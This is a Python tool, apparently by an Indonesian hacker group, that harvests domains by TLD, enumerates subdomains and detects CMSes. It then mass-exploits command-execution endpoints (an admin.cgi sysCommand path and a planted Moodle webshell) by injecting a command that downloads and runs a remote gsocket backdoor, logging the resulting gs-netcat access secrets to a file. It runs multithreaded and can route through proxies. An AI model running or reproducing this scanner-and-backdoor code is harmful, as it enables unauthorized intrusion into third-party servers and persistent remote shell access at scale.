import subprocess
import requests
import time
import re
import urllib3
import dns.resolver
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException, SSLError, ConnectionError
from urllib3.exceptions import NewConnectionError, MaxRetryError, InsecureRequestWarning

# Disable only the InsecureRequestWarning related to unverified HTTPS requests
urllib3.disable_warnings(InsecureRequestWarning)

# Inisialisasi colorama agar kompatibel di Windows
init(autoreset=True)

# Warna teks
yellow = Fore.YELLOW
red = Fore.RED
clear = Style.RESET_ALL

# Daftar CMS dan kata kunci untuk mendeteksi
cms_dict = {
    'WordPress': ['wp-content', 'wp-includes'],
    'Joomla': ['Joomla', 'index.php?option=com_content'],
    'Drupal': ['Drupal', 'sites/all'],
    'Moodle': ['Moodle'],
    'Magento': ['Magento'],
    'Blogger': ['blogspot'],
    'TYPO3': ['typo3/'],
}

yellow = Fore.YELLOW + Style.BRIGHT

print(yellow + "[======================================================]")
print(yellow + "        Grabber, Subfinder, CMS Scanner & RCE")
print(yellow + "                Version  : 1.0")
print(yellow + "            Fatcat Cyber Team ft LSC")
print(yellow + "[======================================================]")
print(Style.RESET_ALL)

def find_subdomains_with_subfinder(domain):
    """Menggunakan Subfinder untuk mencari subdomain yang tersedia."""
    try:
        print(f"[+] Grabbing subdomains for: {domain}")
        result = subprocess.run(['subfinder', '-d', domain, '-silent'], capture_output=True, text=True)

        # Memeriksa jika ada error dalam menjalankan Subfinder
        if result.returncode != 0:
            return []

        # Menyimpan subdomain yang ditemukan
        subdomains = result.stdout.splitlines()
        return subdomains

    except Exception:
        return []

def ensure_http(url):
    """Tambahkan http:// atau https:// jika belum ada."""
    return f"http://{url}" if not url.startswith(("http://", "https://")) else url

def save_to_file(filename, url):
    """Simpan hasil ke file tanpa skema atau www."""
    cleaned_url = url.replace("http://", "").replace("https://", "").replace("www.", "")
    with open(filename, "a") as file:
        file.write(cleaned_url + "\n")

def scan_cms(url):
    """Scan CMS untuk URL tertentu dan simpan hasilnya."""
    cms_found = False
    try:
        cms_response = requests.get(url, timeout=5)
        for cms, keywords in cms_dict.items():
            if any(keyword in cms_response.text for keyword in keywords):
                cms_found = True
                print(f"[{yellow}*{clear}] {url} [ {yellow}{cms} Detected{clear} ]")
                save_to_file(f"{cms.lower()}.txt", url)  # Save to separate CMS file
                break
        
        if not cms_found:
            save_to_file("no_cms_detected.txt", url)

    except requests.RequestException:
        return

def parse_proxy(proxy_string):
    """Parse a proxy string into a dictionary suitable for requests."""
    parts = proxy_string.split(':')
    if len(parts) == 2:
        return {
            "http": f"http://{parts[0]}:{parts[1]}",
            "https": f"https://{parts[0]}:{parts[1]}"
        }
    elif len(parts) == 4:
        proxy_host = parts[0]
        proxy_port = parts[1]
        proxy_user = parts[2]
        proxy_pass = parts[3]
        proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
        return {
            "http": proxy_url,
            "https": proxy_url
        }
    else:
        raise ValueError(f"Invalid proxy format: {proxy_string}")

def load_proxies(file_path):
    proxies = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                if line:
                    proxies.append(parse_proxy(line))
    except FileNotFoundError:
        return proxies
    return proxies

def process_domain(domain, paths, command, proxies=None):
    """Proses RCE untuk domain tertentu."""
    domain = domain.strip()
    
    proxy_dict = None
    if proxies:
        proxy = proxies[0]  # Use the first proxy from the list
        proxy_dict = proxy
    
    for path in paths:
        url_https = f"https://{domain}{path}{command}"
        url_http = f"http://{domain}{path}{command}"
        
        try:
            response = requests.get(url_https, timeout=120, verify=False, proxies=proxy_dict)
            if response.status_code != 200:
                response = requests.get(url_http, timeout=120, proxies=proxy_dict)
            
            if response.status_code == 200:
                print(f"Request succeeded for URL: {domain}")
                
                cleaned_output = response.text.replace('\\"', '"').replace("\\'", "'")
                
                match = re.search(r'gs-netcat -s ["\']([a-zA-Z0-9]+)["\'] -i', cleaned_output)
                if match:
                    extracted_code = match.group(0)
                    print(f"{domain} GSOCKET {extracted_code}")
                    
                    with open("gsvuln.txt", "a") as file:
                        file.write(f"{domain} || {extracted_code}\n")
                    return

            else:
                continue
        
        except (SSLError, NewConnectionError, MaxRetryError, ConnectionError):
            continue
        except RequestException:
            continue

def search_domains(tld):
    """Mencari domain dengan TLD tertentu dari Tranco List."""
    tranco_url = "https://tranco-list.eu/download/65GX/10000000000000000000000000000000000"
    data = get_tranco_data(tranco_url)
    
    if data:
        domains = [line.split(",")[1] for line in data.splitlines() if line.endswith("." + tld)]
        return domains
    return []

def get_tranco_data(url, retries=3, timeout=10):
    """Mengunduh data dari Tranco list dengan retry dan timeout."""
    for attempt in range(retries):
        try:
            response = requests.get(url, timeout=timeout)
            response.raise_for_status()
            return response.text
        except (requests.exceptions.RequestException, requests.exceptions.ChunkedEncodingError):
            time.sleep(2)
    return None

def main():
    tld = input("Input TLD (e.g., ac.id): ")
    output_file = input("Input Output File Name (e.g., output.txt): ")
    use_proxy = input("Use proxy? (Y/n): ").strip().lower() == 'y'
    
    proxies = []
    if use_proxy:
        proxies = load_proxies('proxy.txt')
    
    domains = search_domains(tld)
    paths = [
        "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=",  # Add more paths as needed
        "/local/moodle_webshell/webshell.php?action=exec&cmd="
    ]
    command = "bash -c \"$(curl -fsSL https://gsocket.io/y)\""

    # Mencari subdomain dan memproses CMS serta RCE
    for domain in domains:
        print(f"[{yellow}+{clear}] Grabbing: {domain}")
        subdomains = find_subdomains_with_subfinder(domain)
        all_domains = [domain] + subdomains
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            for result in all_domains:
                url = ensure_http(result)
                executor.submit(scan_cms, url)
                executor.submit(process_domain, result, paths, command, proxies if use_proxy else None)

    print(f"Results saved to {output_file}")

if __name__ == "__main__":
    main()
